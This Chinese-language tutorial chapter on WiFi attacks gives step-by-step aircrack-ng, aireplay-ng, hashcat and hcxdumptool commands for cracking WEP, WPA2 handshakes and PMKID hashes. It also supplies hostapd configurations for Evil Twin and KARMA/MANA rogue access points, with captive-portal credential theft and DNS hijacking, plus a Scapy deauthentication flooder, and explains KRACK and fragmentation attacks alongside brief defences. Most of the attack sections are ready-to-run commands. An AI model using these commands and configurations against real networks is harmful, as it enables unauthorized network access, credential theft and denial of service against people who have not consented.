# WiFi 攻击技术

### 3.1 WEP 破解

```
WEP 破解完整流程：

工具: Aircrack-ng 套件

步骤1: 启用监听模式
├── airmon-ng check kill      # 终止冲突进程
├── airmon-ng start wlan0     # 启用监听模式
└── 生成 wlan0mon 接口

步骤2: 扫描目标网络
├── airodump-ng wlan0mon     # 扫描所有网络
├── 记录目标 AP 的 BSSID 和信道
├── 观察是否有已连接的 Station
└── 确认加密方式为 WEP

步骤3: 捕获数据包
├── airodump-ng -c <channel> --bssid <BSSID> -w wep_capture wlan0mon
├── 被动等待数据积累
└── 目标: 收集足够的 IV 数据包

步骤4: ARP 请求注入（加速数据收集）
├── aireplay-ng -3 -b <BSSID> -h <STATION_MAC> wlan0mon
├── 注入 ARP 请求产生大量响应
├── 如果没有关联的 Station，使用伪造认证
│   └── aireplay-ng -1 0 -a <BSSID> -h <FAKE_MAC> wlan0mon
└── 数据速率可提升到每秒数百个 IV

步骤5: 破解密钥
├── aircrack-ng -b <BSSID> wep_capture-01.cap
├── 当收集到足够的 IV（通常 40,000+）时
├── PTW 攻击自动恢复密钥
└── 输出: KEY FOUND! [ AA:BB:CC:DD:EE ]

时间估计:
├── 高流量网络: 3-5 分钟
├── 低流量网络: 10-30 分钟
└── 使用注入: 大幅缩短时间
```

### 3.2 WPA/WPA2 握手包抓取与离线破解

```
WPA/WPA2 破解流程：

步骤1: 扫描并定位目标
airodump-ng wlan0mon
→ 识别目标 AP: BSSID, 信道, 加密方式(WPA2-PSK)

步骤2: 针对性抓包
airodump-ng -c <channel> --bssid <BSSID> -w wpa_capture wlan0mon
→ 等待合法客户端连接/重连
→ 抓取四次握手包（EAPOL 消息）

步骤3: 加速握手包获取（Deauth 攻击）
aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
→ 发送 5 个 Deauth 帧
→ 强制客户端断开重连
→ 客户端重连时产生握手包
→ airodump-ng 界面显示 WPA handshake

步骤4: 离线密码破解
# 方法A: 使用 aircrack-ng
aircrack-ng -w wordlist.txt wpa_capture-01.cap

# 方法B: 使用 hashcat（GPU 加速）
# 先转换为 hashcat 格式
hashcat -m 2500 wpa_capture-01.hccapx wordlist.txt

# 方法C: 使用 John the Ripper
# 转换格式
hccap2john wpa_capture-01.hccap > hash.txt
john --wordlist=wordlist.txt hash.txt

破解时间估算：
├── 8 字符纯小写字母: CPU 约 2-3 天, GPU 约 1-2 小时
├── 8 字符字母+数字: CPU 约 2 周, GPU 约 1 天
├── 10 字符字母+数字: CPU 数月, GPU 约 1 周
└── 强密码（12+字符混合）: 实际不可行

字典优化建议：
├── 使用手机号字典（国内常见）
├── 使用常见密码 Top 10000
├── 使用 CUPP 定制化字典
├── 使用规则变形（大小写、数字后缀等）
└── 使用 hashcat 规则文件
```

### 3.3 PMKID 攻击

PMKID 攻击是 2018 年由 Jens Steube 发现的新型 WPA2 攻击方法，无需等待客户端连接：

```
PMKID 攻击原理：

PMKID 介绍：
├── PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_STA)
├── 部分支持漫游的 AP 在关联时发送 PMKID
├── PMKID 在第一次 EAPOL 消息中传输
└── 不需要四次握手，仅需一个帧

攻击优势：
├── 不需要客户端在线
├── 不需要执行 Deauth 攻击
├── 不需要等待握手包
├── 更隐蔽，不产生异常流量
└── 仅需与 AP 交互

攻击流程：
# 步骤1: 使用 hcxdumptool 捕获 PMKID
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng

# 或使用 hcxtools 直接请求 PMKID
hcxdumptool -i wlan0mon --filterlist_ap=<BSSID> --enable_status=1

# 步骤2: 转换为 hashcat 格式
hcxpcaptool -z pmkid_hash.txt pmkid.pcapng

# 步骤3: 离线破解
hashcat -m 16800 pmkid_hash.txt wordlist.txt

# 步骤4: 也可使用 airgeddon 等自动化工具
# 支持的 AP 特征：
# - 启用了 RSN（WPA2）
# - 支持漫游（802.11r）
# - 使用 PMKID 缓存

注意事项：
├── 并非所有 AP 都支持 PMKID
├── 主要影响使用 PMK 缓存的 AP
├── WPA3 不受此攻击影响
└── 是对 WPA2 的重大威胁
```

### 3.4 Evil Twin 攻击

```
Evil Twin（邪恶双子）攻击：

攻击原理：
├── 部署一个与合法 AP 相同 SSID 的伪造 AP
├── 使用相同或相似的 BSSID（MAC 地址）
├── 提供更强的信号吸引客户端连接
├── 可配合 Captive Portal 窃取凭据
└── 实施中间人攻击

工具配置示例（使用 hostapd）：

# hostapd 配置文件（evil_twin.conf）
cat > /tmp/evil_twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=Target_Network    # 与目标相同的 SSID
hw_mode=g
channel=6              # 与目标相同或不同信道
macaddr_acl=0
ignore_broadcast_ssid=0

# 如果使用开放网络 + Portal
auth_algs=1

# 如果使用 WPA2（需要知道密码）
#wpa=2
#wpa_passphrase=known_password
#wpa_key_mgmt=WPA-PSK
#wpa_pairwise=CCMP

# 如果使用 802.1X（需要 RADIUS）
#ieee8021x=1
#eapol_version=2
#eap_server=0
#radius_server_clients=/etc/hostapd/radius_clients
EOF

# 启动 Evil Twin AP
hostapd /tmp/evil_twin.conf

# 配置 DHCP 服务
dnsmasq --interface=wlan0 --dhcp-range=192.168.50.10,192.168.50.100,12h

# 配置 Captive Portal（使用 nginx + PHP）
# 重定向所有 HTTP 请求到登录页

# 配置 DNS 劫持
dnsmasq --address=/#/192.168.50.1

攻击增强：
├── 使用 Deauth 攻击断开客户端与合法 AP 的连接
├── 调高伪造 AP 的发射功率
├── 使用相同的 BSSID 增加迷惑性
├── 使用 5GHz 频段减少干扰
└── 伪造 Captive Portal 页面收集凭据
```

### 3.5 KARMA 攻击

```
KARMA 攻击原理：

背景知识：
├── 客户端的"已知网络"列表（Preferred Network List, PNL）
├── 客户端会主动发送 Probe Request 寻找已知网络
├── Probe Request 包含目标 SSID（主动扫描模式）
└── 也可使用广播 Probe Request（隐藏 SSID 模式）

KARMA 攻击流程：
├── 攻击者监听所有 Probe Request
├── 对于每个收到的 Probe Request
│   ├── 提取请求的 SSID
│   ├── 配置 AP 响应该 SSID
│   └── 发送匹配的 Probe Response
├── 客户端认为找到了已知网络
├── 自动连接到攻击者的 AP
└── 攻击者获得中间人位置

MANA 攻击（KARMA 的改进版）：
├── 解决了现代设备不发送定向 Probe 的问题
├── 收集广播 Probe Request
├── 响应所有已知 SSID
├── 维护"已知网络"数据库
├── 当客户端关联时，记录其 PNL
└── 使用这些信息提高成功率

工具实现：
# 使用 hostapd-mana
cat > /tmp/mana.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=RandomSSID
hw_mode=g
channel=6

# MANA 配置
mana_wpaout=/tmp/mana.hccap
mana_loud=1
mana_ssid=KnownNetwork1,KnownNetwork2

# 或使用 bettercap
# sudo bettercap -interface wlan0mon
# > wifi.recon on
# > wifi.deauth <BSSID>
# > set wifi.ap.ssid TargetSSID
# > wifi.ap on
EOF

防御措施：
├── 现代 OS 已禁用定向 Probe Request
├── 使用 WPA3 增强认证
├── 企业环境部署证书验证
├── 客户端配置"不自动连接未知网络"
└── WIDS 检测异常 AP 行为
```

### 3.6 Deauth/Disassociate DoS 攻击

```
Deauth 攻击：

原理：
├── 802.11 管理帧默认不加密
├── 伪造 Deauth/Disassociate 帧发送给客户端或 AP
├── 客户端被迫断开连接
├── WPA2 不提供管理帧保护
└── WPA3 的 PMF（Protected Management Frames）可缓解

Deauth 帧格式：
├── Type: Management (00)
├── Subtype: Deauthentication (1100)
├── Address1: 目标 MAC（客户端或 AP）
├── Address2: 源 MAC（伪造的 AP 或客户端）
├── Address3: BSSID
├── Reason Code: 常用值
│   ├── 1 = Unspecified
│   ├── 4 = Deauth due to inactivity
│   ├── 7 = Class 3 frame from non-associated STA
│   └── 15 = 4-way handshake timeout

攻击命令：
# 使用 aireplay-ng
aireplay-ng -0 0 -a <BSSID> -c <CLIENT_MAC> wlan0mon
# -0 0 = 持续发送 Deauth
# -0 5 = 发送 5 次

# 使用 mdk4/mdk3
mdk4 wlan0mon d -b <BSSID> -c <CLIENT_MAC>
# d = Deauth 模式

# 使用 Python/Scapy
from scapy.all import *
def send_deauth(iface, ap_mac, client_mac):
    pkt = RadioTap()
    pkt /= Dot11(type=0, subtype=12,  # Deauth 帧
                 addr1=client_mac,
                 addr2=ap_mac,
                 addr3=ap_mac)
    pkt /= Dot11Deauth(reason=7)
    sendp(pkt, iface=iface, count=100, inter=0.1)

PMF（Protected Management Frames）防御：
├── 802.11w 标准
├── 加密部分管理帧（Deauth/Disassoc 等）
├── WPA3 强制启用 PMF
├── WPA2 可选启用 PMF
├── 但并非所有客户端支持
└── 部署时需注意兼容性
```

### 3.7 KRACK 攻击

```
KRACK（Key Reinstallation Attack）：

发现者: Mathy Vanhoef (2017)
影响: WPA1/WPA2 所有版本

攻击原理：
├── 利用四次握手状态机缺陷
├── 在第三次握手时阻断/延迟消息
├── AP 重传第三次握手消息
├── Station 每次接收都会重装 PTK
├── 重装密钥导致:
│   ├── 重置包序号（PN）计数器
│   ├── 重置 TX/RX 随机数
│   └── 密钥流重用

攻击流程：
1. 攻击者中间人位置（需先实施信道攻击）
2. 阻断 Station 接收消息3的重传
3. AP 因未收到消息4的重传而重发消息3
4. Station 重新安装已安装的 PTK
5. PN 计数器重置为之前值
6. 后续数据包使用已用过的 PN
7. 攻击者收集相同 PN 的密文
8. 通过已知明文攻击恢复密钥流
9. 可解密部分上行流量

影响分析：
├── 可解密 Station 到 AP 的数据
├── TKIP 配置下可注入数据包
├── CCMP 配置下仅解密不能注入
├── GCMP 配置下可解密和注入
├── Android/Linux 的 wpa_supplicant 影响最大
│   └── 安卓 6.0+ 在消息3重传时重装全零密钥
└── 所有支持 WPA2 的设备均受影响

修复措施：
├── 修补 wpa_supplicant 和 hostapd
├── 确保密钥只安装一次
├── 使用 PN 不回退机制
├── 所有厂商已发布补丁
└── 但旧设备可能永远无法修复

实际限制：
├── 需要中间人位置（信道级攻击）
├── 只能解密少量数据包
├── 不能直接恢复 PMK 或密码
└── 攻击复杂度较高
```

### 3.8 Fragmentation 攻击

```
Fragmentation 攻击（分段攻击）：

原理：
├── 802.11 支持数据帧分段
├── 分段帧使用相同的密钥流
├── 如果能获取一个分段的明文
├── 可以推算出密钥流
└── 进而解密/伪造其他分段

Beck-Tews 攻击（2008）：
├── 针对 TKIP 的攻击
├── 利用 TKIP 的 Michael 弱点
├── 需要客户端使用 QoS（802.11e）
├── 攻击步骤：
│   1. 执行 Deauth 攻击
│   2. 捕获 ARP 请求
│   3. 利用 TKIP 分段弱点
│   4. 篡改并注入数据
│   └── 每个包注入需要约 12 分钟
└── 适用于 WPA-TKIP 配置

改进攻击（Tews-Weinmann-Pyshkin）：
├── 不需要 QoS 支持
├── 利用更广泛的 TKIP 弱点
└── 但需要更多数据包

实际影响：
├── 仅影响使用 TKIP 的网络
├── AES-CCMP 不受影响
├── 推动了 TKIP 的废弃
└── 现代网络应使用 CCMP/GCMP
```

---

---

